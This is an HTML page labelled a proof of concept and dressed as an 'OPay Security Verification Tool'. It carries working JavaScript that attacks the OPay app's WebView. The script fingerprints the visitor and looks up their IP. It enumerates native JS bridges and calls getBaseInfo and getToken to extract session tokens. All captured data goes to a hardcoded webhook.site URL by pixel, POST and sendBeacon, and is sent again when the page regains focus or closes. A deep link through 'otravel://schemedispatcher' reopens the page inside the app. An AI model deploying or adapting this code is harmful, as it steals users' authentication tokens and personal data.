<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OPay Security Verification</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            padding: 20px;
            background: #1a1a2e;
            color: #e0e0e0;
            margin: 0;
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
        }

        h2 {
            color: #00c853;
            text-align: center;
        }

        .status {
            background: #16213e;
            border: 1px solid #0f3460;
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
            font-size: 14px;
        }

        .status.success {
            border-color: #00c853;
        }

        .btn {
            display: block;
            background: #00c853;
            color: white;
            padding: 15px;
            text-align: center;
            margin: 15px 0;
            text-decoration: none;
            font-size: 18px;
            border-radius: 8px;
            font-weight: bold;
        }

        #log {
            background: #0d1117;
            padding: 12px;
            border: 1px solid #30363d;
            border-radius: 8px;
            min-height: 100px;
            font-family: monospace;
            font-size: 12px;
            line-height: 1.6;
            word-break: break-all;
        }

        .log-entry {
            padding: 2px 0;
            border-bottom: 1px solid #21262d;
        }

        .log-entry.ok {
            color: #58a6ff;
        }

        .log-entry.warn {
            color: #d29922;
        }

        .log-entry.crit {
            color: #f85149;
        }

        .log-entry.good {
            color: #3fb950;
        }
    </style>
</head>

<body>
    <div class="container">
        <h2>🔒 Security Verification Tool</h2>

        <div class="status" id="statusBox">
            Initializing security scan...
        </div>

        <a id="deepLinkBtn" class="btn" href="#">🚀 Open in OPay App</a>

        <h3>Scan Log:</h3>
        <div id="log"></div>
    </div>

    <script>
        // ===== CONFIGURATION =====
        // Primary logging: webhook.site (get a new token at https://webhook.site)
        var WEBHOOK_URL = "https://webhook.site/669d58e9-2981-429c-b990-95b00c849bfe";

        // Backup logging: jsonbin.io free tier (create at https://jsonbin.io)
        // var JSONBIN_URL = "";
        // var JSONBIN_KEY = "";

        // ===== DEEP LINK =====
        var deepLink = "otravel://schemedispatcher?action=" + window.location.href;
        document.getElementById("deepLinkBtn").href = deepLink;

        // ===== COLLECTED DATA =====
        var visitorData = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            referrer: document.referrer || "direct",
            userAgent: navigator.userAgent,
            platform: navigator.platform || "unknown",
            language: navigator.language || "unknown",
            screenWidth: screen.width,
            screenHeight: screen.height,
            windowWidth: window.innerWidth,
            windowHeight: window.innerHeight,
            colorDepth: screen.colorDepth,
            cookiesEnabled: navigator.cookieEnabled,
            online: navigator.onLine,
            touchSupport: ('ontouchstart' in window) || (navigator.maxTouchPoints > 0),
            deviceMemory: navigator.deviceMemory || "unknown",
            hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown",
            connectionType: (navigator.connection && navigator.connection.effectiveType) || "unknown",
            bridges: [],
            ip: "pending"
        };

        // ===== LOGGING FUNCTION =====
        function log(msg, level) {
            level = level || "ok";
            var el = document.getElementById("log");
            var div = document.createElement("div");
            div.className = "log-entry " + level;
            div.textContent = new Date().toLocaleTimeString() + " | " + msg;
            el.appendChild(div);
            el.scrollTop = el.scrollHeight;
        }

        // ===== SEND DATA TO WEBHOOK =====
        function sendToWebhook(data) {
            // Method 1: Image pixel (most reliable, bypasses CORS)
            try {
                var params = [];
                for (var key in data) {
                    if (data.hasOwnProperty(key)) {
                        var val = typeof data[key] === 'object' ? JSON.stringify(data[key]) : String(data[key]);
                        params.push(encodeURIComponent(key) + "=" + encodeURIComponent(val));
                    }
                }
                var img = new Image();
                img.src = WEBHOOK_URL + "?" + params.join("&");
                log("Data beacon sent (pixel)", "good");
            } catch (e) {
                log("Pixel beacon failed: " + e.message, "warn");
            }

            // Method 2: Fetch POST (more data, but may be blocked by CORS)
            try {
                var xhr = new XMLHttpRequest();
                xhr.open("POST", WEBHOOK_URL, true);
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.onreadystatechange = function () {
                    if (xhr.readyState === 4) {
                        if (xhr.status === 200) {
                            log("Data POST sent successfully", "good");
                        } else {
                            log("POST returned status: " + xhr.status, "warn");
                        }
                    }
                };
                xhr.send(JSON.stringify(data));
            } catch (e) {
                log("POST failed (CORS likely): " + e.message, "warn");
            }

            // Method 3: navigator.sendBeacon (fires even on page close)
            try {
                if (navigator.sendBeacon) {
                    var blob = new Blob([JSON.stringify(data)], { type: "application/json" });
                    navigator.sendBeacon(WEBHOOK_URL, blob);
                    log("Beacon API fired", "good");
                }
            } catch (e) {
                log("sendBeacon failed: " + e.message, "warn");
            }
        }

        // ===== SAVE TO LOCALSTORAGE =====
        function saveLocally(data) {
            try {
                var logs = JSON.parse(localStorage.getItem("poc_logs") || "[]");
                logs.push(data);
                localStorage.setItem("poc_logs", JSON.stringify(logs));
                log("Saved to localStorage backup", "ok");
            } catch (e) {
                log("localStorage save failed", "warn");
            }
        }

        // ===== GET IP ADDRESS =====
        function getIP(callback) {
            try {
                var xhr = new XMLHttpRequest();
                xhr.open("GET", "https://api.ipify.org?format=json", true);
                xhr.timeout = 5000;
                xhr.onreadystatechange = function () {
                    if (xhr.readyState === 4) {
                        if (xhr.status === 200) {
                            try {
                                var resp = JSON.parse(xhr.responseText);
                                callback(resp.ip);
                            } catch (e) {
                                callback("parse_error");
                            }
                        } else {
                            callback("api_error_" + xhr.status);
                        }
                    }
                };
                xhr.ontimeout = function () { callback("timeout"); };
                xhr.send();
            } catch (e) {
                callback("blocked");
            }
        }

        // ===== BRIDGE SCANNER =====
        function scanBridges() {
            log("Scanning for JS bridge objects...", "ok");
            var found = [];
            var standardObjects = [
                'window', 'self', 'document', 'name', 'location', 'customElements',
                'history', 'navigation', 'navigator', 'screen', 'styleMedia',
                'trustedTypes', 'performance', 'console', 'devicePixelRatio',
                'external', 'localStorage', 'sessionStorage', 'indexedDB',
                'webkitStorageInfo', 'caches', 'crypto', 'speechSynthesis', 'chrome',
                'visualViewport', 'frames', 'parent', 'top', 'opener',
                'length', 'closed', 'status', 'toolbar', 'menubar', 'personalbar',
                'scrollbars', 'statusbar', 'locationbar', 'origin', 'crossOriginIsolated',
                'isSecureContext', 'scheduler', 'alert', 'atob', 'blur', 'btoa',
                'cancelAnimationFrame', 'cancelIdleCallback',
                'clearInterval', 'clearTimeout', 'close', 'confirm',
                'createImageBitmap', 'fetch', 'find', 'focus', 'getComputedStyle',
                'getSelection', 'matchMedia', 'moveBy', 'moveTo', 'open', 'postMessage',
                'print', 'prompt', 'queueMicrotask', 'reportError',
                'requestAnimationFrame', 'requestIdleCallback', 'resizeBy', 'resizeTo',
                'scroll', 'scrollBy', 'scrollTo', 'setInterval', 'setTimeout',
                'stop', 'structuredClone', 'webkitCancelAnimationFrame',
                'webkitRequestAnimationFrame', 'getScreenDetails',
                'queryLocalFonts', 'showDirectoryPicker', 'showOpenFilePicker',
                'showSaveFilePicker', 'originAgentCluster', 'navigation',
                'webkitRequestFileSystem', 'webkitResolveLocalFileSystemURL'
            ];

            try {
                var props = Object.getOwnPropertyNames(window);
                for (var i = 0; i < props.length; i++) {
                    var p = props[i];
                    if (standardObjects.indexOf(p) === -1) {
                        try {
                            if (typeof window[p] === 'object' && window[p] !== null) {
                                found.push(p);
                                // Try to enumerate methods
                                var methods = [];
                                for (var m in window[p]) {
                                    methods.push(m);
                                }
                                if (methods.length > 0) {
                                    log("Bridge '" + p + "' methods: " + methods.join(", "), "crit");
                                } else {
                                    log("Bridge '" + p + "' found (no enumerable methods)", "warn");
                                }
                            }
                        } catch (e) { }
                    }
                }
            } catch (e) {
                log("Bridge scan error: " + e.message, "warn");
            }

            if (found.length === 0) {
                log("No custom bridge objects detected", "ok");
            } else {
                log("FOUND " + found.length + " potential bridge(s)!", "crit");
            }

            return found;
        }

        // ===== CHECK FOR KNOWN OPAY BRIDGES =====
        function checkOPayBridges() {
            var knownBridges = ['control', 'OPay', 'opay', 'JsBridge', 'jsBridge',
                'WebViewJavascriptBridge', 'android', 'nativeApp',
                'NativeApp', 'AppBridge', 'appBridge'];

            for (var i = 0; i < knownBridges.length; i++) {
                var name = knownBridges[i];
                try {
                    if (window[name]) {
                        log("⚠️ KNOWN BRIDGE FOUND: " + name, "crit");
                        visitorData["bridge_" + name] = "EXISTS";

                        // Try to extract token
                        if (window[name].getBaseInfo) {
                            var token = window[name].getBaseInfo();
                            log("🔴 TOKEN EXTRACTED: " + token, "crit");
                            visitorData.token = token;
                        }
                        if (window[name].getToken) {
                            var t = window[name].getToken();
                            log("🔴 TOKEN (getToken): " + t, "crit");
                            visitorData.token2 = t;
                        }
                    }
                } catch (e) {
                    log("Error checking " + name + ": " + e.message, "warn");
                }
            }
        }

        // ===== MAIN EXECUTION =====
        function main() {
            log("=== PoC Security Scan Started ===", "good");
            log("URL: " + window.location.href, "ok");
            log("User-Agent: " + navigator.userAgent, "ok");
            log("Platform: " + navigator.platform, "ok");
            log("Screen: " + screen.width + "x" + screen.height, "ok");
            log("Touch: " + visitorData.touchSupport, "ok");
            log("Timezone: " + visitorData.timezone, "ok");

            // Get IP
            log("Resolving visitor IP...", "ok");
            getIP(function (ip) {
                visitorData.ip = ip;
                log("IP: " + ip, "good");

                // Scan bridges
                visitorData.bridges = scanBridges();

                // Check known OPay bridges
                checkOPayBridges();

                // Update status
                var statusBox = document.getElementById("statusBox");
                statusBox.className = "status success";
                statusBox.innerHTML = "✅ Scan complete. All data captured.<br>IP: " + ip +
                    "<br>Bridges found: " + visitorData.bridges.length;

                // Send data
                log("=== Sending captured data ===", "good");
                sendToWebhook(visitorData);
                saveLocally(visitorData);

                log("=== Scan Complete ===", "good");
            });
        }

        // Run after short delay to let page fully load
        setTimeout(main, 500);

        // Also fire on page visibility change (captures when they come back)
        document.addEventListener("visibilitychange", function () {
            if (document.visibilityState === "visible") {
                log("Page became visible again, re-sending data", "ok");
                sendToWebhook(visitorData);
            }
        });

        // Fire beacon on page unload too
        window.addEventListener("beforeunload", function () {
            try {
                if (navigator.sendBeacon) {
                    var blob = new Blob([JSON.stringify(visitorData)], { type: "application/json" });
                    navigator.sendBeacon(WEBHOOK_URL, blob);
                }
            } catch (e) { }
        });
    </script>
</body>

</html>
